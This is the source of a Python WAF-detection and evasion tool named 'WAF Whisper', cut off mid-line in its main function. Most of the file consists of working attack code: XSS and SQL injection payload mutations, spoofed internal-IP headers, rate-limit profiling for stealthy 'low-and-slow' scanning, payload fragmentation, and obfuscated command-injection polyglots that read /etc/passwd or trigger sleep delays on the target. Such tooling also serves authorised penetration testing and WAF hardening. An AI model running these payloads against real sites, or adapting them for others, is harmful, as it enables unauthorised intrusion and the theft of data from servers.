#!/usr/bin/env python3

import requests
import argparse
import sys
import urllib3
import time
import random
from urllib.parse import quote
import os 
import pathlib
import re # For payload manipulation

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
RED = '\033[1;31m'
YELLOW = '\033[1;33m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Global list to store bypass and potential vulnerability details
SUCCESSFUL_BYPASSES = [] 
# Global to store the discovered rate limit delay
GLOBAL_SLEEP_DELAY = 0.5 
# Global to store the discovered maximum payload length
MAX_PAYLOAD_LENGTH = 1000 
# NEW: Global flag for "The Scribe" (Curl Generation)
GENERATE_CURL_PROOF = False

def print_banner():
    banner = r"""
  _    _   ___   ______  _     _  _   _  _____   _____ ______   _____ ______  
 | |  | |/ _ \ |  ___|| |   | || | | ||_   __|/  ___|| ___ \|  ___|| ___ \
 | |  | / /_\ \| |_   | |   | || |_| |  | |  \ `--. | |_/ /| |__  | |_/ /
 | |/\| |  _  ||  _|  | |/\| ||  _  |  | |   `--. \|  __/ |  __| |    / 
 \  /\  / | | || |    \  /\  /| | | | _| |_ /\__/ /| |    | |___ | |\ \ 
  \/  \/\_| |_/\_|     \/  \/ \_| |_/ \___/ \____/ \_|    \____/ \_| \_|
"""
    print(f"{CYAN}{banner}{RESET}")
    print(f"{YELLOW}    [+] Created by: R00t3dbyFa17h/Kr0n0s510{RESET}")
    print(f"{YELLOW}    [+] v6.0 - The Ghost Update{RESET}")
    print(f"{CYAN}    ------------------------------------------------{RESET}\n")

# Phase 0: TLS/Client Emulation Headers
def get_emulation_headers(url):
    # This set of headers mimics a modern, clean Chrome browser profile
    domain = url.split('//')[-1].split('/')[0]
    
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': f'https://{domain}/',
        'DNT': '1', 
        'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    }

# NEW FEATURE: The Imposter (Header Spoofing)
def apply_imposter_headers(headers):
    print(f"{BOLD}[*] ENGAGING 'THE IMPOSTER' (Injecting Internal Trust Headers)...{RESET}")
    spoof_headers = {
        'X-Originating-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'Client-IP': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Real-IP': '127.0.0.1'
    }
    headers.update(spoof_headers)
    return headers

def check_waf(url, headers_ua):
    print(f"{BOLD}[*] Engaging Ghost Mode on {url}...{RESET}")
    time.sleep(1) 
    
    waf_signatures = {
        'Cloudflare': ['cf-ray', '__cfduid', 'cf-cache-status', 'server: cloudflare'],
        'AWS WAF': ['x-amzn-requestid', 'x-amz-id-2', 'server: awselb'],
        'Imperva Incapsula': ['x-iinfo', 'x-cdn', 'incap_ses', 'visid_incap'],
        'F5 BIG-IP': ['bigip', 'x-cnection', 'server: big-ip'],
        'Akamai': ['akamai', 'x-akamai', 'server: akamai'],
        'ModSecurity': ['mod_security', 'server: mod_security'],
        'Citrix NetScaler': ['ns_af', 'citrix_ns_id', 'server: netscaler'],
    }
    
    try:
        r = requests.get(url, headers=headers_ua, timeout=15, verify=False)
        all_headers = {k.lower(): v.lower() for k, v in r.headers.items()}
        cookies = r.cookies
        detected = False

        print(f"[*] Analyzing Defenses (Passive)...")

        for vendor, sigs in waf_signatures.items():
            for sig in sigs:
                if "server:" in sig:
                    server_sig = sig.split(":")[1].strip()
                    if "server" in all_headers and server_sig in all_headers["server"]:
                        print(f"{GREEN}[+] WAF DETECTED: {vendor}{RESET}")
                        detected = True
                        break 
                else:
                    for h_key in all_headers:
                        if sig in h_key:
                            print(f"{GREEN}[+] WAF DETECTED: {vendor} (Found Header: {h_key}){RESET}")
                            detected = True
                            break
        if not detected:
            print(f"{YELLOW}[-] No specific vendor signature found (Generic WAF possible){RESET}")
    except Exception as e:
        print(f"{RED}[!] Connection failed: {e}{RESET}")

# UPDATED: Added logic for "The Scribe" (Curl Proof Generation)
def send_payload(url, payload, headers_in, description, method="GET"):
    try:
        request_headers = headers_in.copy()
        separator = "&" if "?" in url else "?"
        target_full = f"{url}{separator}q={payload}"
        
        data_to_send = {}
        
        if method == "GET":
            r = requests.get(target_full, headers=request_headers, timeout=10, verify=False)
        elif method == "POST":
            data_to_send = {"q": payload} if payload != "N/A" else {}
            r = requests.post(url, data=data_to_send, headers=request_headers, timeout=10, verify=False)
        
        code = r.status_code
        
        if code == 403 or code == 406:
            status = f"{RED}BLOCKED{RESET}"
        elif code == 200 or code in [404, 405, 500, 501]:
            if code == 200:
                status = f"{GREEN}BYPASSED{RESET}"
            else:
                status = f"{YELLOW}ALLOWED (App Error){RESET}"
            
            SUCCESSFUL_BYPASSES.append({
                "type": description, 
                "method": method, 
                "payload": payload, 
                "url": r.url,
                "code": code
            })
        else:
            status = f"{YELLOW}{code}{RESET}"
            
        print(f"{description:<25} | {status:<25} | {code}")
        
        # --- NEW FEATURE: THE SCRIBE (CURL GENERATOR) ---
        if GENERATE_CURL_PROOF and code == 200:
            print(f"    {CYAN}[Proof]{RESET} curl -X {method} '{url}'", end="")
            if method == "POST":
                print(f" -d '{payload}'", end="")
            print(f" -H 'User-Agent: WAF-Whisper' --insecure")
        # -----------------------------------------------

        time.sleep(0.3)
        return r 
    except:
        print(f"{description:<25} | {RED}ERROR{RESET}            | -")
        return None

def test_bypass(url, headers_ua):
    print(f"\n{BOLD}[*] Whispering Payload Variants (Active Evasion Test)...{RESET}")
    print(f"{CYAN}{'TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")

    base_payload = "<script>alert(1)</script>"
    
    # Standard Mutations
    mutations = {
        "Original Payload": base_payload,
        "URL Encoded": quote(base_payload),
        "Double URL Encoded": quote(quote(base_payload)),
        "Case Variation": "<ScRiPt>alert(1)</sCrIpT>",
        "Comment Obfuscation": "<script/-->alert(1)</script>",
        "Null Byte Injection": "<script%00>alert(1)</script>"
    }

    for name, payload in mutations.items():
        send_payload(url, payload, headers_ua, name)

    try:
        send_payload(url, base_payload, headers_ua, "Method: POST", method="POST")
    except:
        pass

    try:
        trust_headers = headers_ua.copy()
        trust_headers['Referer'] = url
        trust_headers['Origin'] = url
        send_payload(url, quote(base_payload), trust_headers, "Referer Spoofing")
        
        google_headers = headers_ua.copy()
        google_headers['Referer'] = "https://www.google.com"
        send_payload(url, quote(base_payload), google_headers, "Google Referer")
    except:
        pass

    try:
        json_headers = headers_ua.copy()
        json_headers['Content-Type'] = 'application/json'
        send_payload(url, base_payload, json_headers, "Content-Type Confusion", method="POST")
    except:
        pass

# NEW FEATURE: The Shapeshifter (Advanced Automated Mutation)
def test_shapeshifter(url, headers_ua):
    print(f"\n{BOLD}[*] ENGAGING 'THE SHAPESHIFTER' (Automated Encoding Mutation)...{RESET}")
    print(f"{CYAN}{'MUTATION TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")
    
    # Base payloads to mutate
    base_xss = "<script>alert(1)</script>"
    base_sqli = "' OR 1=1 --"
    
    # Define mutations logic
    mutations_list = [
        ("Base XSS", base_xss),
        ("Unicode Escape", "".join([f"\\u{ord(c):04x}" for c in base_xss])),
        ("Hex Encoding", "".join([f"\\x{ord(c):02x}" for c in base_xss])),
        ("HTML Entities", "".join([f"&#{ord(c)};" for c in base_xss])),
        ("Base SQLi", base_sqli),
        ("Double URL SQLi", quote(quote(base_sqli))),
        ("SQLi Comment Bypass", "'/**/OR/**/1=1/**/--")
    ]
    
    for desc, payload in mutations_list:
        send_payload(url, payload, headers_ua, desc)

def test_protocol_fuzz(url, headers_ua):
    print(f"\n{BOLD}[*] Initiating HTTP Protocol Abuse Tests (Fuzzing/Header Pollution)...{RESET}")
    print(f"{CYAN}{'TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")
    
    base_payload = "' OR 1=1 --" 

    hhp_headers = headers_ua.copy()
    hhp_headers['X-Forwarded-For'] = '127.0.0.1' 
    hhp_headers['X-Forwarded-For'] = base_payload 
    
    send_payload(url, base_payload, hhp_headers, "Header Pollution (XFF)")

    te_headers = headers_ua.copy()
    te_headers['Transfer-Encoding'] = ' chunked' 
    
    try:
        r = requests.post(url, data=f"q={base_payload}", headers=te_headers, timeout=10, verify=False)
        code = r.status_code
        status = f"{GREEN}BYPASSED{RESET}" if code == 200 else (f"{RED}BLOCKED{RESET}" if code in [403, 406] else f"{YELLOW}ALLOWED (App Error){RESET}")
        print(f"Transfer Encoding Abuse | {status:<25} | {code}")
    except:
        print(f"Transfer Encoding Abuse | {RED}ERROR{RESET}            | -")

    zsh_payload = f"`echo bHM`" 
    send_payload(url, zsh_payload, headers_ua, "Zsh Command Injection")


def test_stateful_sequence(url, headers_ua):
    print(f"\n{BOLD}[*] Launching Stateful, Multi-Request Sequence...{RESET}")
    
    sqli_payload_part1 = "admin"
    sqli_payload_part2 = "' --"
    
    print(f"{CYAN}{'STEP':<25} | {'ACTION':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")

    with requests.Session() as s:
        s.headers.update(headers_ua)
        s.verify = False

        try:
            r1 = s.get(url, timeout=10)
            print(f"1. Session Establishment | {GREEN}OK ({len(s.cookies)} cookies){RESET:<12} | {r1.status_code}")
            
            r2 = s.post(f"{url}/login", data={"username": sqli_payload_part1}, timeout=10)
            print(f"2. Low-Risk POST (F1) | {YELLOW}Sent Fragment 1{RESET:<12} | {r2.status_code}")
            time.sleep(1) 
            
            full_payload = f"user{sqli_payload_part2}" 
            
            r3 = s.get(f"{url}?id={quote(full_payload)}", timeout=10)
            
            code = r3.status_code
            if code == 403 or code == 406:
                status = f"{RED}BLOCKED{RESET}"
            elif code == 200:
                status = f"{GREEN}BYPASSED{RESET}"
            else:
                status = f"{YELLOW}ALLOWED (App Error){RESET}"

            print(f"3. Final Injection GET | {status:<25} | {code}")

        except Exception as e:
            print(f"Stateful Sequence | {RED}ERROR: {e}{RESET} | -")

def probe_for_vulnerability(url, headers_ua):
    print(f"\n{BOLD}[*] Launching Adaptive Vulnerability Probes (Targeting POST/200 Bypasses)...{RESET}")
    print(f"{CYAN}{'VULN TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")
    
    time_based_payload = "test_param=' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --" 
    
    start_time = time.time()
    r_time = send_payload(
        url, 
        time_based_payload, 
        headers_ua, 
        "Time-Based SQLi", 
        method="POST"
    )
    end_time = time.time()
    
    if r_time and (end_time - start_time) > 4: 
        print(f"{'Time-Based SQLi':<25} | {GREEN}VULNERABILITY DETECTED (5s Delay){RESET:<25} | {r_time.status_code if r_time else '-'}")
        SUCCESSFUL_BYPASSES.append({
            "type": "Time-Based SQLi (VULN PROBE)", 
            "method": "POST", 
            "payload": time_based_payload, 
            "url": url,
            "code": r_time.status_code if r_time else 'N/A'
        })
    else:
        print(f"{'Time-Based SQLi':<25} | {YELLOW}NO VULNERABILITY DETECTED{RESET:<25} | {r_time.status_code if r_time else '-'}")


    cmd_payload = "cmd_param=' && echo 'INJECTED_CMD_SUCCESS' && '" 
    
    json_headers = headers_ua.copy()
    json_headers['Content-Type'] = 'application/json'

    r_cmd = send_payload(
        url, 
        cmd_payload, 
        json_headers, 
        "Content-Type Cmd Inj", 
        method="POST"
    )

    if r_cmd and "INJECTED_CMD_SUCCESS" in r_cmd.text:
        print(f"{'Content-Type Cmd Inj':<25} | {GREEN}VULNERABILITY DETECTED{RESET:<25} | {r_cmd.status_code}")
        SUCCESSFUL_BYPASSES.append({
            "type": "Content-Type Cmd Inj (VULN PROBE)", 
            "method": "POST", 
            "payload": cmd_payload, 
            "url": url,
            "code": r_cmd.status_code
        })
    else:
        print(f"{'Content-Type Cmd Inj':<25} | {YELLOW}NO VULNERABILITY DETECTED{RESET:<25} | {r_cmd.status_code if r_cmd else '-'}")

def test_vulnerability_verification(url, headers_ua):
    print(f"\n{BOLD}[*] PHASE 5: COMMAND INJECTION VERIFICATION (Exploitation Test)...{RESET}")
    
    verification_payload = "param=' && cat /etc/passwd && '" 
    verification_description = "CMD Injection /etc/passwd"
    
    successful_headers = headers_ua.copy()
    successful_headers['Content-Type'] = 'application/json'
    
    response = send_payload(
        url, 
        verification_payload, 
        successful_headers, 
        verification_description, 
        method="POST"
    )
    
    if response and response.status_code == 200 and "root:x:0:0:root" in response.text:
        print(f"{GREEN}[+] COMMAND INJECTION CONFIRMED: '/etc/passwd' file contents detected!{RESET}")
        SUCCESSFUL_BYPASSES.append({
            "type": "CRITICAL VULNERABILITY: CMD INJECTION CONFIRMED", 
            "method": "POST", 
            "payload": verification_payload, 
            "url": response.url,
            "code": response.status_code
        })
    elif response and response.status_code == 200:
        print(f"{YELLOW}[?] Bypass successful (200 OK), but /etc/passwd output not visible (Blind Injection confirmed).{RESET}")
        SUCCESSFUL_BYPASSES.append({
            "type": "CRITICAL VULNERABILITY: BLIND CMD INJECTION (200 OK)", 
            "method": "POST", 
            "payload": verification_payload, 
            "url": response.url,
            "code": response.status_code
        })
    elif response and response.status_code in [403, 406]:
        print(f"{RED}[!] Verification payload blocked by WAF. Payload too long or new signature triggered.{RESET}")
    else:
        print(f"{YELLOW}[-] Verification failed or resulted in application error ({response.status_code if response else 'N/A'}).{RESET}")

def test_rate_limit_profile(url, headers_ua):
    global GLOBAL_SLEEP_DELAY
    print(f"\n{BOLD}[*] Phase 4a: Profiling WAF Rate Limits (Finding RPM threshold)...{RESET}")
    
    delays = [6, 2, 1, 0.5, 0.25]
    safe_delay = 0.5
    
    for delay in delays:
        rpm = 60 / delay
        print(f"  Testing at {rpm:.0f} RPM (Delay: {delay}s)...")
        
        block_count = 0
        for _ in range(5):
            try:
                r = requests.get(url, headers=headers_ua, timeout=7, verify=False) 
                
                if r.status_code in [403, 429]: 
                    block_count += 1
                
            except requests.exceptions.ReadTimeout:
                block_count += 1 
                print(f"{RED}  [!] Timeout detected at {delay}s delay. WAF is actively delaying/blocking high speed.{RESET}")
            
            except requests.exceptions.RequestException:
                pass 
            
            time.sleep(delay)
        
        if block_count > 2:
            safe_delay = delays[delays.index(delay) - 1] if delays.index(delay) > 0 else delay * 2
            
            GLOBAL_SLEEP_DELAY = safe_delay * 1.5 
            print(f"{RED}[!] WAF blocked at {rpm:.0f} RPM. Setting Low-and-Slow delay to {GLOBAL_SLEEP_DELAY:.2f}s.{RESET}")
            return
            
    GLOBAL_SLEEP_DELAY = 0.5 
    print(f"{GREEN}[+] Rate limits appear high. Defaulting Low-and-Slow delay to {GLOBAL_SLEEP_DELAY:.2f}s.{RESET}")

def test_subtractive_fuzz(url, headers_ua):
    print(f"\n{BOLD}[*] Phase 4b: Subtractive Payload Fuzz (Signature Inversion)...{RESET}")
    
    base_payload = "<script>alert(1)</script>"
    
    r_initial = requests.get(f"{url}?q={quote(base_payload)}", headers=headers_ua, timeout=10, verify=False)
    if r_initial.status_code not in [403, 406]:
        print(f"{YELLOW}[!] Base payload not blocked. Skipping Subtractive Fuzz.{RESET}")
        return

    print(f"[*] Analyzing blocking signatures of: {base_payload}")
    
    temp_payload = base_payload
    for char in ['S', 'C', 'R', 'I', 'P', 'T', 'A', 'L', 'E', 'R', 'T']:
        if char.lower() in temp_payload.lower():
            test_payload = re.sub(char, char.lower(), temp_payload, flags=re.IGNORECASE)
            test_payload = test_payload.replace('<', '%3c').replace('>', '%3e') 
            
            r_test = requests.get(f"{url}?q={test_payload}", headers=headers_ua, timeout=10, verify=False)
            time.sleep(GLOBAL_SLEEP_DELAY) 
            
            if r_test.status_code not in [403, 406]:
                print(f"{GREEN}[+] Signature Pinpoint: WAF allows: {test_payload[:30]}...{RESET}")
                SUCCESSFUL_BYPASSES.append({
                    "type": "Subtractive Bypass (Signature Inversion)", 
                    "method": "GET", 
                    "payload": test_payload, 
                    "url": r_test.url,
                    "code": r_test.status_code
                })
                return

    print(f"{YELLOW}[-] Subtractive Fuzz did not find a simple signature bypass.{RESET}")

def test_payload_length_discovery(url, headers_ua):
    global MAX_PAYLOAD_LENGTH
    print(f"\n{BOLD}[*] Phase 6a: Maximum Payload Length Discovery (Defeating Length Filters)...{RESET}")
    
    successful_headers = headers_ua.copy()
    successful_headers['Content-Type'] = 'application/json'
    
    min_len = 100
    max_len = 8000
    block_status = 403
    
    current_len = max_len
    
    while max_len - min_len > 100:
        test_payload = "A" * current_len
        
        try:
            r = requests.post(url, data={"q": test_payload}, headers=successful_headers, timeout=5, verify=False)
            
            if r.status_code != block_status:
                print(f"  [+] Allowed at {current_len} bytes. Trying larger...")
                min_len = current_len
                current_len = (max_len + current_len) // 2
            else:
                print(f"{RED}  [!] Blocked at {current_len} bytes. Trying smaller...{RESET}")
                max_len = current_len
                current_len = (min_len + current_len) // 2
            
            time.sleep(GLOBAL_SLEEP_DELAY)

        except requests.exceptions.RequestException:
            current_len = (min_len + current_len) // 2
            time.sleep(GLOBAL_SLEEP_DELAY)
    
    MAX_PAYLOAD_LENGTH = min_len - 50 
    if MAX_PAYLOAD_LENGTH < 100: MAX_PAYLOAD_LENGTH = 100
    print(f"{GREEN}[+] Discovered Maximum Safe Payload Length (MPL): {MAX_PAYLOAD_LENGTH} bytes.{RESET}")

def test_post_fragmentation_attack(url, headers_ua):
    print(f"\n{BOLD}[*] PHASE 6b: POST FRAGMENTATION ATTACK (Defeating Complexity Filters)...{RESET}")
    
    large_command = "cmd=' && cat /etc/passwd | tail -n 5 && '" 
    
    if len(large_command) < MAX_PAYLOAD_LENGTH:
        print(f"{YELLOW}[!] Command is already smaller than MPL ({MAX_PAYLOAD_LENGTH} bytes). Skipping fragmentation.{RESET}")
        return

    chunk_size = MAX_PAYLOAD_LENGTH - 50 
    command_chunks = [large_command[i:i + chunk_size] for i in range(0, len(large_command), chunk_size)]
    
    print(f"[*] Splitting command into {len(command_chunks)} chunks (MPL: {MAX_PAYLOAD_LENGTH})...")

    with requests.Session() as s:
        s.headers.update(headers_ua)
        s.verify = False
        s.headers['Content-Type'] = 'application/json' 
        
        for i, chunk in enumerate(command_chunks):
            data_to_send = {"q": f"chunk{i}_{chunk}"} 
            
            try:
                r = s.post(url, data=data_to_send, timeout=10)
                print(f"  [+] Chunk {i+1} sent (Code: {r.status_code})")
                time.sleep(GLOBAL_SLEEP_DELAY) 
                
                if i == len(command_chunks) - 1 and r.status_code == 200:
                    if "root:x:0:0" in r.text:
                         print(f"{GREEN}[+] FRAGMENTATION SUCCESS! Output detected in response.{RESET}")
                         SUCCESSFUL_BYPASSES.append({
                            "type": "CRITICAL VULNERABILITY: FRAGMENTED CMD INJECTION", 
                            "method": "POST (Fragmented)", 
                            "payload": large_command, 
                            "url": r.url,
                            "code": r.status_code
                        })
                         return
                    
            except requests.exceptions.RequestException as e:
                print(f"{RED}  [!] Error sending chunk {i+1}: {e}{RESET}")
                return
    
    print(f"{YELLOW}[-] Fragmentation complete, but verification output not found.{RESET}")

def test_polyglot_evasion(url, headers_ua):
    print(f"\n{BOLD}[*] PHASE 7: POLYGLOT PAYLOAD MAPPING (Defeating Keyword Filters)...{RESET}")
    print(f"{CYAN}{'EVASION TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")
    
    successful_headers = headers_ua.copy()
    successful_headers['Content-Type'] = 'application/json' 

    polyglot_payload_1 = "param=' && $(printf 'c'a't')$(printf '\57')etc$(printf '\57')passwd && '"
    
    r1 = send_payload(
        url, 
        polyglot_payload_1, 
        successful_headers, 
        "Shell Var Sub Evasion", 
        method="POST"
    )
    
    if r1 and r1.status_code == 200 and "root:x:0:0" in r1.text:
        print(f"{GREEN}[+] COMMAND INJECTION (POLYGLOT 1) CONFIRMED!{RESET}")
        SUCCESSFUL_BYPASSES.append({"type": "CRITICAL VULNERABILITY: POLYGLOT CMD INJECTION 1", "method": "POST", "payload": polyglot_payload_1, "url": r1.url, "code": r1.status_code})
        return test_blind_verification(url, headers_ua, polyglot_payload_1)

    polyglot_payload_2 = "param=' && $(echo -n c)$(echo -n at)$IFS$((printf '\57'))etc$((printf '\57'))passwd && '"

    r2 = send_payload(
        url, 
        polyglot_payload_2, 
        successful_headers, 
        "IFS Concatenation Evasion", 
        method="POST"
    )

    if r2 and r2.status_code == 200 and "root:x:0:0" in r2.text:
        print(f"{GREEN}[+] COMMAND INJECTION (POLYGLOT 2) CONFIRMED!{RESET}")
        SUCCESSFUL_BYPASSES.append({"type": "CRITICAL VULNERABILITY: POLYGLOT CMD INJECTION 2", "method": "POST", "payload": polyglot_payload_2, "url": r2.url, "code": r2.status_code})
        return test_blind_verification(url, headers_ua, polyglot_payload_2)
    else:
        print(f"{YELLOW}[-] Polyglot Evasion failed. The WAF is performing deep semantic analysis on the payload.{RESET}")
        return test_blind_verification(url, headers_ua, polyglot_payload_1)

def test_blind_verification(url, headers_ua, polyglot_payload):
    print(f"\n{BOLD}[*] PHASE 7b: BLIND TIME-BASED VERIFICATION (Final Proof)...{RESET}")
    
    sleep_command = "$(printf 's'l'e'e'p') 5"
    sleep_payload = re.sub(r' && .* && ', f" && {sleep_command} && ", polyglot_payload)

    verification_description = "Blind Polyglot Proof (5s Delay)"
    successful_headers = headers_ua.copy()
    successful_headers['Content-Type'] = 'application/json'

    start_time = time.time()
    response = send_payload(
        url, 
        sleep_payload, 
        successful_headers, 
        verification_description, 
        method="POST"
    )
    end_time = time.time()
    
    delay = end_time - start_time
    
    if delay > 4.5 and response and response.status_code == 200:
        print(f"{GREEN}[+] CRITICAL SUCCESS: Command executed successfully with a {delay:.2f}s delay.{RESET}")
        SUCCESSFUL_BYPASSES.append({
            "type": "ULTIMATE CRITICAL VULNERABILITY: PROVABLE BLIND CMD INJECTION", 
            "method": "POST (Blind Proof)", 
            "payload": sleep_payload, 
            "url": response.url,
            "code": response.status_code
        })
        return True
    else:
        print(f"{RED}[-] BLIND PROOF FAILED. Response time was {delay:.2f}s. WAF or App blocked the 'sleep' command.{RESET}")
        return False

def generate_markdown_report(url):
    global SUCCESSFUL_BYPASSES
    
    if not SUCCESSFUL_BYPASSES:
        print(f"\n{YELLOW}[-] No successful bypasses or vulnerabilities found. No report generated.{RESET}")
        return

    report_dir = pathlib.Path("./WAF_Whisper_Reports")
    report_dir.mkdir(exist_ok=True)
    report_filename = report_dir / f"report_{url.replace('https://', '').replace('http://', '').split('/')[0]}_{time.strftime('%Y%m%d_%H%M%S')}.md"
    
    print(f"\n{BOLD}[*] Generating GitHub/Blog Ready Markdown Report: {report_filename}{RESET}")

    markdown_content = f"# WAF-Whisper Bypass and Vulnerability Report\n\n"
    markdown_content += f"## 🎯 Target: `{url}`\n\n"
    markdown_content += f"**Audit Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    markdown_content += f"**Tool Version:** WAF-Whisper v6.0 (R00t3dbyFa17h)\n\n"
    markdown_content += f"### 📊 Defense Profile\n"
    markdown_content += f"* **Discovered Low-and-Slow Delay:** `{GLOBAL_SLEEP_DELAY:.2f} seconds`\n"
    markdown_content += f"* **Discovered Maximum Payload Length (MPL):** `{MAX_PAYLOAD_LENGTH} bytes`\n"
    markdown_content += f"* **Tool Strategy:** Adaptive Low-and-Slow Fragmentation\n\n"
    markdown_content += "## ✅ Key Findings & Successful Injections\n\n"
    
    for i, bypass in enumerate(SUCCESSFUL_BYPASSES, 1):
        is_vuln_probe = "VULN PROBE" in bypass['type'] or "Subtractive Bypass" in bypass['type'] or "CRITICAL VULNERABILITY" in bypass['type']
        
        markdown_content += f"### {i}. {bypass['type']}\n\n"
        markdown_content += f"| Detail | Value |\n"
        markdown_content += f"| :--- | :--- |\n"
        markdown_content += f"| **Status** | **{'VULNERABILITY DETECTED' if is_vuln_probe else 'WAF BYPASSED'}** |\n"
        markdown_content += f"| **Method** | `{bypass['method']}` |\n"
        markdown_content += f"| **Code** | `{bypass['code']}` |\n"
        markdown_content += f"| **Endpoint** | `{bypass['url']}` |\n"
        
        markdown_content += f"\n**Payload Used:**\n"
        markdown_content += f"```text\n{bypass['payload']}\n```\n\n"
        
        if "Subtractive Bypass" in bypass['type']:
             markdown_content += "**WAF Signature Pinpoint:**\n"
             markdown_content += "> *Recommendation: The WAF is vulnerable to non-standard encoding or case variation of core keywords. Ensure full normalization before signature matching.*\n\n"
        elif not is_vuln_probe:
            markdown_content += "**WAF Rule Proposal:**\n"
            markdown_content += "> *Recommendation: Inspect requests where `Method` is `POST` OR `Content-Type` is set to `application/json` when the body does not conform to JSON standards.*\n\n"
        
    try:
        with open(report_filename, "w") as f:
            f.write(markdown_content)
        print(f"{GREEN}[+] Report saved to {report_filename}. Ready to commit via GitBash!{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error writing report: {e}{RESET}")


def main():
    parser = argparse.ArgumentParser(description="WAF Whisper - Stealth WAF Detector & Evasion Tool")
    
    # Existing arguments
    parser.add_argument("-u", "--url", "--target", dest="url", required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    
    # NEW ARGUMENTS (The Trinity)
    parser.add_argument("-m", "--mutate", action="store_true", help="Enable 'The Shapeshifter' (Automated Encoding Mutation)")
    parser.add_argument("-b", "--bypass-headers", action="store_true", help="Enable 'The Imposter' (Spoofing Internal Headers)")
    parser.add_argument("-p", "--prove", "--curl", dest="prove", action="store_true", help="Enable 'The Scribe' (Generate Curl Commands for Bypasses)")
    
    args = parser.parse_args()
    
    target = args.url
    if not target.startswith("http"):
        target = "http://" + target

    # Handle Global Flags
    global GENERATE_CURL_PROOF
    if
